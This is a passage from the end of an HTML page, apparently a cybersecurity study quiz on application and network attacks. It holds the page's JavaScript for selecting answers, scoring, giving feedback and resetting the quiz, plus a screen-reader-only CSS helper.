    </div>`;
  });
  container.querySelectorAll('.quiz-option').forEach(opt => {
    opt.addEventListener('click', function() {
      const name = this.querySelector('input').name;
      container.querySelectorAll(`[name="${name}"]`).forEach(r => r.closest('.quiz-option').classList.remove('selected'));
      this.classList.add('selected');
      this.querySelector('input').checked = true;
    });
  });
}

function submitQuiz() {
  let score = 0;
  quizData.forEach((item, i) => {
    const selected = document.querySelector(`input[name="q${i}"]:checked`);
    const question = document.getElementById('qq-' + i);
    const feedback = document.getElementById('qfb-' + i);
    if (selected) {
      const val = parseInt(selected.value);
      if (val === item.ans) {
        score++;
        question.classList.add('correct');
        document.getElementById(`qopt-${i}-${val}`).classList.add('right');
        feedback.className = 'quiz-feedback show correct-fb';
        feedback.textContent = '✓ Correct! ' + item.exp;
      } else {
        question.classList.add('incorrect');
        document.getElementById(`qopt-${i}-${val}`).classList.add('wrong');
        document.getElementById(`qopt-${i}-${item.ans}`).classList.add('right');
        feedback.className = 'quiz-feedback show incorrect-fb';
        feedback.textContent = '✗ Incorrect. ' + item.exp;
      }
    } else {
      question.classList.add('incorrect');
      document.getElementById(`qopt-${i}-${item.ans}`).classList.add('right');
      feedback.className = 'quiz-feedback show incorrect-fb';
      feedback.textContent = '✗ Not answered. ' + item.exp;
    }
  });
  document.querySelectorAll('.quiz-option input').forEach(i => i.disabled = true);
  document.getElementById('submitQuizBtn').style.display = 'none';
  document.getElementById('resetQuizBtn').style.display = 'inline-flex';
  const scoreEl = document.getElementById('quizScore');
  scoreEl.style.display = 'block';
  document.getElementById('scoreNum').textContent = score + ' / ' + quizData.length;
  const pct = Math.round((score / quizData.length) * 100);
  let msg = pct >= 80 ? 'Excellent! You have a strong grasp of application and network attack concepts.' :
            pct >= 60 ? 'Good effort! Review the sections where you missed questions.' :
            'Keep studying! Focus on the attack types and their countermeasures.';
  document.getElementById('scoreLabel').textContent = pct + '% — ' + msg;
  scoreEl.scrollIntoView({ behavior: 'smooth' });
}

function resetQuiz() {
  document.querySelectorAll('.quiz-question').forEach(q => { q.classList.remove('correct','incorrect'); });
  document.querySelectorAll('.quiz-option').forEach(o => { o.classList.remove('selected','right','wrong'); });
  document.querySelectorAll('.quiz-option input').forEach(i => { i.disabled = false; i.checked = false; });
  document.querySelectorAll('.quiz-feedback').forEach(f => { f.className = 'quiz-feedback'; f.textContent = ''; });
  document.getElementById('quizScore').style.display = 'none';
  document.getElementById('submitQuizBtn').style.display = 'inline-flex';
  document.getElementById('resetQuizBtn').style.display = 'none';
}

document.addEventListener('DOMContentLoaded', buildQuiz);

/* ===================================================================
   SR-ONLY
=================================================================== */
const srStyle = document.createElement('style');
srStyle.textContent = '.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}';
document.head.appendChild(srStyle);
</script>
</body>
</html>
